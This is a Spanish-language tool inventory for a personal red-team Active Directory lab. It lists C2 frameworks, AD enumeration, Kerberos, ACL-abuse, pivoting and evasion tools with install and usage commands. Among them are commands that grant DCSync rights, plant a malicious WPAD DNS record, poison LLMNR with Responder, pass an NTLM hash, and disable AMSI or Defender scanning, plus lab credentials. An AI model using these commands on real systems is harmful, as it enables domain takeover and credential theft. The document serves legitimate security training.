# 🛠️ Arsenal de Herramientas — Red Team Ops Roadmap

> Documentación de todas las herramientas instaladas y utilizadas durante la realización del roadmap.  
> Organizado por categoría funcional, con descripción técnica, uso principal y lab de referencia.

---

## 📋 Índice

1. [C2 Frameworks](#-c2-frameworks)
2. [Enumeración de Active Directory](#-enumeración-de-active-directory)
3. [Ataques de Kerberos y Credenciales](#-ataques-de-kerberos-y-credenciales)
4. [ADCS y ACL Abuse](#-adcs-y-acl-abuse)
5. [Pivoting y Tunelización](#-pivoting-y-tunelización)
6. [Post-Explotación y Acceso Remoto](#-post-explotación-y-acceso-remoto)
7. [Evasión y Ejecución en Memoria](#-evasión-y-ejecución-en-memoria)
8. [Reconocimiento y Escaneo](#-reconocimiento-y-escaneo)
9. [Wordlists y Diccionarios](#-wordlists-y-diccionarios)
10. [Infraestructura del Lab](#-infraestructura-del-lab)

---

## 🔴 C2 Frameworks

### Sliver (BishopFox)
- **Descripción:** Framework C2 moderno de código abierto. Soporta múltiples protocolos (mTLS, HTTP/S, DNS, WireGuard) y generación dinámica de implantes.
- **Uso en el roadmap:** Reemplaza a Cobalt Strike para simulación de adversarios, gestión de beacons y operaciones de Red Team.
- **Instalación:**
  ```bash
  curl https://sliver.sh/install | sudo bash
  sudo systemctl enable sliver --now
  sliver-client
  ```
- **Ruta:** `/usr/local/bin/sliver` — servicio: `sliver.service`
- **Labs:** Lab-01, Lab-02, Lab-03, Lab-04, Phase-03, Phase-04

---

### Havoc C2
- **Descripción:** Framework C2 avanzado con interfaz gráfica, soporte para agentes en C y evasión de EDR mediante técnicas de syscalls directas.
- **Uso en el roadmap:** Operaciones de Red Team con evasión activa de defensas.
- **Instalación:**
  ```bash
  sudo apt install -y golang git build-essential libssl-dev libfontconfig1 mingw-w64 nasm musl-tools
  git clone https://github.com/HavocFramework/Havoc /opt/havoc
  ```
- **Labs:** Phase-03, Phase-04

---

## 🔍 Enumeración de Active Directory

### BloodHound Community Edition (CE)
- **Descripción:** Suite de análisis de grafos de Active Directory v2. Identifica attack paths hacia Domain Admin. Versión CE corre via Docker con Neo4j 4.4 + APOC.
- **Instalación:**
  ```bash
  mkdir -p ~/tools/ad/bloodhound-ce && cd ~/tools/ad/bloodhound-ce
  curl -L https://raw.githubusercontent.com/SpecterOps/BloodHound/main/examples/docker-compose/docker-compose.yml \
    -o docker-compose.yml
  # IMPORTANTE: editar docker-compose.yml — fijar neo4j:4.4 con NEO4J_PLUGINS: '["apoc"]'
  sudo docker compose up -d
  sudo docker logs bloodhound-ce-bloodhound-1 2>&1 | grep "Initial Password"
  ```
- **Acceso:** `http://localhost:8080` — email: `spam@example.com`
- **Ruta:** `~/tools/ad/bloodhound-ce/`
- **Nota:** Neo4j 5 NO es compatible con BloodHound CE actual — usar neo4j:4.4 obligatoriamente
- **Labs:** Lab-01, Lab-04+

---

### SharpHound
- **Descripción:** Colector de datos para BloodHound CE. Versión v2.5.9 compatible con BloodHound CE 5.x. Cubre ACLs, GPOs y ADCS que bloodhound-python no recoge.
- **Instalación:**
  ```bash
  curl -L https://github.com/BloodHoundAD/SharpHound/releases/download/v2.5.9/SharpHound-v2.5.9.zip \
    -o /tmp/sharphound.zip
  unzip /tmp/sharphound.zip -d /tmp/sharphound/
  cp /tmp/sharphound/SharpHound.exe /opt/redteam/windows/
  ```
- **Ruta:** `/opt/redteam/windows/SharpHound.exe`
- **Uso desde Evil-WinRM (requiere credenciales explícitas):**
  ```powershell
  .\SharpHound.exe -c All --zipfilename output \
    --ldapusername usuario --ldappassword password \
    --domain atackcorp.local --domaincontroller 10.0.2.10
  ```
- **Nota OPSEC:** Sin credenciales explícitas falla desde sesión WinRM (Network Logon no propaga contexto Kerberos)
- **Labs:** Lab-01, Lab-04+

---

### bloodhound-python
- **Descripción:** Colector Python para BloodHound. Opera via LDAP desde Kali — sin ejecutar binarios en el objetivo. Coverage parcial (sin ACLs/GPOs completos).
- **Instalación:** `pip install bloodhound --break-system-packages`
- **Uso:**
  ```bash
  bloodhound-python -u usuario -p password -d dominio -ns IP -c All --zip
  ```
- **Nota:** Los ZIPs de bloodhound-python legacy NO son compatibles con BloodHound CE 5.x para importación. Usar SharpHound para importar en CE.
- **Labs:** Lab-01, Lab-04

---

### PowerView
- **Descripción:** Módulo PowerShell de PowerSploit para enumeración ofensiva de AD. Enumera usuarios, grupos, GPOs, ACLs y trusts.
- **Ruta:** `/usr/share/windows-resources/powersploit/Recon/PowerView.ps1`
- **Labs:** Lab-01, Lab-04, Lab-05

---

### Adalanche
- **Descripción:** Alternativa open source a BloodHound. Análisis offline de dumps de AD sin necesidad de agente en el dominio.
- **Instalación:**
  ```bash
  wget https://github.com/lkarlslund/Adalanche/releases/latest/download/adalanche-linux-x64 \
    -O /opt/adalanche && chmod +x /opt/adalanche
  ```
- **Labs:** Lab-08, Lab-12

---

### enum4linux-ng
- **Descripción:** Reescritura moderna de enum4linux. Enumera información SMB/RPC: usuarios, shares, políticas de contraseñas.
- **Instalación:** `sudo apt install -y enum4linux-ng`
- **Labs:** Lab-01, Lab-02

---

## 🎫 Ataques de Kerberos y Credenciales

### Impacket
- **Descripción:** Suite de scripts Python para interacción con protocolos de red Windows (SMB, MSRPC, Kerberos, LDAP).
- **Herramientas clave:**
  | Script | Función |
  |--------|---------|
  | `GetNPUsers.py` | AS-REP Roasting |
  | `GetUserSPNs.py` | Kerberoasting |
  | `secretsdump.py` | Volcado de hashes NTLM via DCSync o SAM |
  | `getTGT.py` | Overpass-the-Hash — obtener TGT con hash NTLM |
  | `dacledit.py` | Modificar/leer DACLs de objetos AD |
  | `psexec.py` | Ejecución remota vía SMB |
  | `ticketer.py` | Forja de tickets Kerberos (Golden/Silver) |
  | `lookupsid.py` | Enumeración de SIDs del dominio |
- **Instalación:** `sudo apt install -y impacket-scripts`
- **Labs:** Lab-01, Lab-02, Lab-03, Lab-04, Lab-05+

---

### Rubeus
- **Descripción:** Herramienta C# para interacción ofensiva con Kerberos. Soporta AS-REP Roasting, Kerberoasting, Pass-the-Ticket, Overpass-the-Hash y más.
- **Ruta:** `/opt/rubeus/Rubeus.exe`
- **Labs:** Lab-01, Lab-05, Lab-07

---

### krb5-user
- **Descripción:** Herramientas Kerberos MIT para Linux — incluye `klist`, `kinit`, `kdestroy`.
- **Instalación:** `sudo apt install -y krb5-user` (realm: ATACKCORP.LOCAL)
- **Uso:**
  ```bash
  export KRB5CCNAME=fin.garcia.ccache
  klist fin.garcia.ccache    # Verificar ticket válido
  ```
- **Labs:** Lab-04+

---

### Hashcat
- **Descripción:** Cracker de hashes GPU/CPU. Soporta más de 300 tipos de hash incluyendo Kerberos, NTLM y NTLMv2.
- **Instalación:** `sudo apt install -y hashcat`
- **Labs:** Lab-01, Lab-04, Lab-05

---

### John the Ripper
- **Descripción:** Cracker de contraseñas clásico. Preferido en entornos VirtualBox sin GPU.
- **Instalación:** `sudo apt install -y john`
- **Labs:** Lab-01, Lab-03

---

## 🔐 ADCS y ACL Abuse

### Certipy
- **Descripción:** Herramienta Python para enumerar y explotar vulnerabilidades ADCS (ESC1-ESC13).
- **Versión:** v5.0.4
- **Instalación:** `pip install certipy-ad --break-system-packages`
- **Labs:** Lab-03, Lab-04+

---

### impacket-dacledit
- **Descripción:** Script de Impacket para leer y modificar DACLs de objetos AD via LDAP.
- **Uso:**
  ```bash
  # Añadir DCSync rights
  impacket-dacledit atackcorp.local/fin.garcia:'Finance2024!' \
    -action write -rights DCSync \
    -principal fin.garcia \
    -target-dn "DC=atackcorp,DC=local" -dc-ip 10.0.2.10

  # Verificar
  impacket-dacledit atackcorp.local/fin.garcia:'Finance2024!' \
    -action read -target-dn "DC=atackcorp,DC=local" -dc-ip 10.0.2.10

  # Limpiar (OPSEC)
  impacket-dacledit atackcorp.local/fin.garcia:'Finance2024!' \
    -action remove -rights DCSync \
    -principal fin.garcia \
    -target-dn "DC=atackcorp,DC=local" -dc-ip 10.0.2.10
  ```
- **Nota:** Genera backup automático `.bak` de la DACL antes de modificar
- **Labs:** Lab-04+

---

### bloodyAD
- **Descripción:** Herramienta Python para abuso de ACLs AD — GenericWrite, WriteDACL, ForceChangePassword.
- **Instalación:** `pip install bloodyad --break-system-packages`
- **Labs:** Lab-01, Lab-04, Lab-05

---

### dnstool.py (krbrelayx)
- **Descripción:** Herramienta para abusar de ADIDNS — crear/modificar/eliminar registros DNS via LDAP sin privilegios de administrador DNS.
- **Ruta:** `/opt/redteam/krbrelayx/dnstool.py`
- **Uso:**
  ```bash
  # Añadir registro WPAD malicioso
  python3 /opt/redteam/krbrelayx/dnstool.py \
    -u 'atackcorp\fin.garcia' -p 'Finance2024!' \
    --record 'wpad' --action add --data 10.0.2.9 10.0.2.10

  # Eliminar (OPSEC)
  python3 /opt/redteam/krbrelayx/dnstool.py \
    -u 'atackcorp\fin.garcia' -p 'Finance2024!' \
    --record 'wpad' --action remove --data 10.0.2.9 10.0.2.10
  ```
- **Nota:** Requiere desactivar DNS Global Query Block List en DC para registros WPAD/ISATAP
- **Labs:** Lab-04+

---

### PetitPotam
- **Descripción:** Herramienta de coerción NTLM via EfsRpcOpenFileRaw. Fuerza autenticación del DC hacia un host controlado.
- **Ruta:** `/opt/redteam/PetitPotam.py`
- **Labs:** Lab-01, Lab-03

---

### Responder
- **Descripción:** Herramienta de envenenamiento LLMNR/NBT-NS/MDNS y captura de hashes NTLMv2.
- **Instalación:** `sudo apt install -y responder`
- **Uso:**
  ```bash
  # Modo análisis (no captura, solo observa)
  sudo responder -I eth0 -A

  # Modo activo con WPAD y Force auth
  sudo responder -I eth0 -wF --lm
  ```
- **Nota:** Conflicto con BloodHound CE Docker y Sliver en puerto 80 — parar con `sudo pkill responder` + `sudo fuser -k 80/tcp`
- **Labs:** Lab-04+

---

## 🔀 Pivoting y Tunelización

### Ligolo-ng
- **Descripción:** Herramienta de tunneling avanzada. Crea interfaces TUN en el atacante para enrutar tráfico a redes internas sin SOCKS proxy.
- **Ruta:** `/opt/ligolo/`
- **Labs:** Lab-02, Lab-09, Lab-10

---

### Chisel
- **Descripción:** Túnel TCP/UDP sobre HTTP con soporte SOCKS5.
- **Instalación:** `sudo apt install -y chisel`
- **Labs:** Lab-02, Lab-09

---

## 💻 Post-Explotación y Acceso Remoto

### Evil-WinRM
- **Descripción:** Cliente WinRM ofensivo con shell interactiva, upload/download y bypass AMSI integrado.
- **Instalación:** `sudo apt install -y evil-winrm`
- **Uso:**
  ```bash
  evil-winrm -i 10.0.2.10 -u backup_svc -p 'Backup2024!'
  evil-winrm -i 10.0.2.10 -u Administrador -H bc3abc2e0673a58e9e559d415b56d69d
  ```
- **Nota upload:** Usar comillas: `upload "/ruta/archivo.exe"` o `upload "/ruta/archivo.exe" "C:\destino\archivo.exe"`
- **Labs:** Lab-01, Lab-02, Lab-03, Lab-04+

---

### CrackMapExec / NetExec
- **Descripción:** Suite de post-explotación para redes Windows. Validación masiva de credenciales sobre SMB, WinRM, LDAP y MSSQL.
- **Instalación:** `sudo apt install -y crackmapexec`
- **Labs:** Lab-01, Lab-04, Lab-10

---

### Metasploit Framework
- **Instalación:** `sudo apt install -y metasploit-framework`
- **Labs:** Lab-03, Lab-09, Lab-10

---

## 🥷 Evasión y Ejecución en Memoria

### AMSI Bypass
- **Técnicas documentadas:**
  - Patch de `amsi.dll` en memoria mediante PowerShell
  - Ofuscación de strings con `[Char]` casting
  - `Set-MpPreference -DisableScriptScanning $true` (requiere admin + Tamper Protection off)
- **Labs:** Lab-01, Lab-08, Lab-09

---

### Donut
- **Descripción:** Convierte ejecutables en shellcode PIC para inyección en memoria.
- **Instalación:** `sudo apt install -y python3-donut`
- **Labs:** Lab-08, Phase-03

---

## 🌐 Reconocimiento y Escaneo

### Nmap
- **Instalación:** `sudo apt install -y nmap`
- **Uso típico:**
  ```bash
  nmap -p- --min-rate 5000 -oA nmap/ports 10.0.2.10
  nmap -sC -sV -p <puertos> -oA nmap/detailed 10.0.2.10
  ```
- **Labs:** Todos

---

### Masscan / Gobuster / Feroxbuster
- **Instalación:** `sudo apt install -y masscan gobuster feroxbuster`
- **Labs:** Lab-09, Lab-10, Lab-11, Lab-12

---

## 📚 Wordlists y Diccionarios

### SecLists + RockYou
- **Instalación:**
  ```bash
  sudo apt install -y seclists
  sudo gunzip /usr/share/wordlists/rockyou.txt.gz
  ```
- **Labs:** Todos

---

## 🏗️ Infraestructura del Lab

### Oracle VM VirtualBox 7.0
- **Red:** NAT Network `LabRedTeam` — Segmento `10.0.2.0/24`

### Máquinas del entorno

| Host | Sistema Operativo | IP | RAM | Rol |
|------|------------------|----|-----|-----|
| DC-01 | Windows Server 2022 Standard Evaluation | `10.0.2.10` | 4GB | Domain Controller |
| WKSTN-01 | Windows 11 Enterprise Evaluation | `10.0.2.8` | 3GB | Workstation corporativa |
| Kali | Kali Linux 2026.1 | `10.0.2.9` | 8GB | Máquina atacante |

### Configuración de red permanente en Kali

```bash
sudo nmcli con add type ethernet con-name "LabRedTeam" ifname eth0 \
  ipv4.method manual \
  ipv4.addresses 10.0.2.9/24 \
  ipv4.gateway 10.0.2.1 \
  ipv4.dns 10.0.2.10 \
  connection.autoconnect yes
sudo nmcli con up LabRedTeam
```

---

## 📊 Estado de Instalación

| Categoría | Herramienta | Estado | Ruta |
|-----------|-------------|--------|------|
| C2 | Sliver v1.7.3 | ✅ Instalado | `/usr/local/bin/sliver` |
| C2 | Havoc C2 | 🔄 Pendiente compilación | `/opt/havoc` |
| AD Enum | BloodHound CE (Docker) | ✅ Instalado | `~/tools/ad/bloodhound-ce/` |
| AD Enum | SharpHound v2.5.9 | ✅ Instalado | `/opt/redteam/windows/SharpHound.exe` |
| AD Enum | bloodhound-python | ✅ Instalado | `bloodhound-python` |
| AD Enum | PowerView | ✅ Instalado | `/usr/share/windows-resources/powersploit/` |
| AD Enum | Adalanche | ✅ Instalado | `/opt/adalanche` |
| AD Enum | enum4linux-ng | ✅ Instalado | `enum4linux-ng` |
| Kerberos | Impacket v0.14 | ✅ Instalado | `impacket-*` |
| Kerberos | Rubeus | ✅ Instalado | `/opt/rubeus/Rubeus.exe` |
| Kerberos | Kerbrute | ✅ Instalado | `kerbrute` |
| Kerberos | krb5-user | ✅ Instalado | `klist`, `kinit` |
| ACL/ADCS | Certipy v5.0.4 | ✅ Instalado | `certipy` |
| ACL/ADCS | bloodyAD | ✅ Instalado | `bloodyAD` |
| ACL/ADCS | dacledit | ✅ Instalado | `impacket-dacledit` |
| ACL/ADCS | dnstool.py | ✅ Instalado | `/opt/redteam/krbrelayx/dnstool.py` |
| ACL/ADCS | PetitPotam | ✅ Instalado | `/opt/redteam/PetitPotam.py` |
| ACL/ADCS | Responder | ✅ Instalado | `responder` |
| Cracking | Hashcat | ✅ Instalado | `hashcat` |
| Cracking | John the Ripper | ✅ Instalado | `john` |
| Pivoting | Ligolo-ng | ✅ Instalado | `/opt/ligolo/` |
| Pivoting | Chisel | ✅ Instalado | `chisel` |
| Post-Explot | Evil-WinRM v3.9 | ✅ Instalado | `evil-winrm` |
| Post-Explot | CrackMapExec | ✅ Instalado | `crackmapexec` |
| Post-Explot | Metasploit | ✅ Instalado | `msfconsole` |
| Evasión | Donut | ✅ Instalado | `donut` |
| Evasión | mingw-w64 | ✅ Instalado | `x86_64-w64-mingw32-gcc` |
| Escaneo | Nmap 7.99 | ✅ Instalado | `nmap` |
| Escaneo | Masscan | ✅ Instalado | `masscan` |
| Escaneo | Gobuster / Feroxbuster | ✅ Instalado | `gobuster`, `feroxbuster` |
| Wordlists | SecLists | ✅ Instalado | `/usr/share/seclists/` |
| Wordlists | RockYou | ✅ Instalado | `/usr/share/wordlists/rockyou.txt` |

---

*Última actualización: Mayo 2026 — Lab-04 IRON FOREST — Adrián Camacho*